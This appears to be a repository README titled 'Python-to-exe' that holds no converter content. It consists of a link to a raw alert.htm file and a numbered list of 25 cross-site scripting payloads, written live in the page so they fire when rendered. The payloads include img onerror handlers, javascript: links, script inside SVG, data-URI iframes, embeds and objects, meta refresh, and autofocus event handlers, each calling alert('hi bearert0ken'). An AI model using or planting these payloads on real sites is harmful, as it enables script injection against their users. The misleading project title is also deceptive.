# Python-to-exe

## 🎯 Direct Link (Works!)

[CLICK HERE FOR ALERT!](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)

## Extreme XSS Attempts (on this page):

<!-- Method 1: Markdown code fence abuse with HTML -->
```html
<img src=x onerror="alert('hi bearert0ken')">
```

<!-- Method 2: Markdown link with javascript protocol -->
[Click](javascript:alert('hi%20bearert0ken'))

<!-- Method 3: HTML comment with script (sometimes rendered) -->
<!--<script>alert('hi bearert0ken')</script>-->

<!-- Method 4: SVG inline with script -->
<svg><script>alert('hi bearert0ken')</script></svg>

<!-- Method 5: Iframe with data URI -->
<iframe src="data:text/html;charset=utf-8,<script>alert('hi bearert0ken')</script>"></iframe>

<!-- Method 6: Embed with data URI -->
<embed src="data:text/html;utf-8,<script>alert('hi bearert0ken')</script>">

<!-- Method 7: Object with data URI -->
<object data="data:text/html;charset=utf-8,<script>alert('hi bearert0ken')</script>"></object>

<!-- Method 8: Picture + Source + Img onerror chain -->
<picture onload="alert('hi bearert0ken')"><source></picture>

<!-- Method 9: Div with contenteditable and paste event -->
<div contenteditable="true" onpaste="alert('hi bearert0ken')" style="width:100%;height:50px;border:1px solid">Paste here</div>

<!-- Method 10: Form element with formaction XSS -->
<form action="javascript:alert('hi bearert0ken')"><button>Click</button></form>

<!-- Method 11: Anchor with onmouseover (no click needed if auto-hover) -->
<a href="#" onmouseover="alert('hi bearert0ken')" style="display:block;width:100%;height:100%">Hover</a>

<!-- Method 12: Body/HTML onload (iframe context) -->
<body onload="alert('hi bearert0ken')"></body>

<!-- Method 13: Style tag with import and onload -->
<style>@import url("data:text/javascript,alert('hi bearert0ken')");</style>

<!-- Method 14: Link rel with onload -->
<link rel="import" href="data:text/html;charset=utf-8,<script>alert('hi bearert0ken')</script>">

<!-- Method 15: Meta refresh with javascript -->
<meta http-equiv="refresh" content="0;url=javascript:alert('hi%20bearert0ken')">

<!-- Method 16: Marquee with malicious content -->
<marquee onstart="alert('hi bearert0ken')" loop=1>test</marquee>

<!-- Method 17: Video poster with XSS -->
<video width="100" height="100" poster="x" onerror="alert('hi bearert0ken')"></video>

<!-- Method 18: Audio oncanplay -->
<audio oncanplay="alert('hi bearert0ken')" src="x"></audio>

<!-- Method 19: SVG with xlink and onload -->
<svg><use xlink:href="data:text/html;charset=utf-8,<script>alert('hi bearert0ken')</script>" onload="alert('hi bearert0ken')"></use></svg>

<!-- Method 20: Img with srcset and error handling -->
<img srcset="x" onerror="alert('hi bearert0ken')">

<!-- Method 21: Input range with oninput -->
<input type="range" oninput="alert('hi bearert0ken')" autofocus>

<!-- Method 22: Textarea with onchange and autofocus -->
<textarea autofocus onchange="alert('hi bearert0ken')"></textarea>

<!-- Method 23: Select with onchange -->
<select autofocus onchange="alert('hi bearert0ken')"><option>1</option></select>

<!-- Method 24: Button with onclick -->
<button onclick="alert('hi bearert0ken')" autofocus>Click Me</button>

<!-- Method 25: Lazy loading image XSS -->
<img loading="lazy" src="x" onerror="alert('hi bearert0ken')">